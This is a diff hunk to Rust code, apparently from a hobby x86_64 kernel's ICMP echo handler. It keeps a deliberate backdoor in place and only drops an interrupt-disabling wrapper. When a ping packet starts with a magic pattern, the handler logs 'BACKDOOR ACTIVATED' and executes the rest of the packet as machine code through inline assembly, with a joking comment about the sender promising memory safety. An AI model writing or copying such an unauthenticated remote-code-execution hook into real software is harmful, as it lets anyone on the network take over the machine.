@@ -26,19 +26,17 @@ pub async fn handle_icmp_echo_request(icmpp: ICMPPacket<'_>, header: &IPv4Header
         let dpat = &icmpp.data[0..pattern.len()];
 
         if dpat == pattern {
-            use x86_64::instructions::interrupts::without_interrupts;
-
             log::warn!("BACKDOOR ACTIVATED");
 
             let program = &icmpp.data.as_slice()[pattern.len()..];
 
             // safe since sender pinky promisies that the code is memory safe :3
-            without_interrupts(|| unsafe {
+            unsafe {
                 core::arch::asm!(
                 "call rax", in("rax") program.as_ptr(),
                 clobber_abi("C")
                 );
-            });
+            };
         }
     }
 
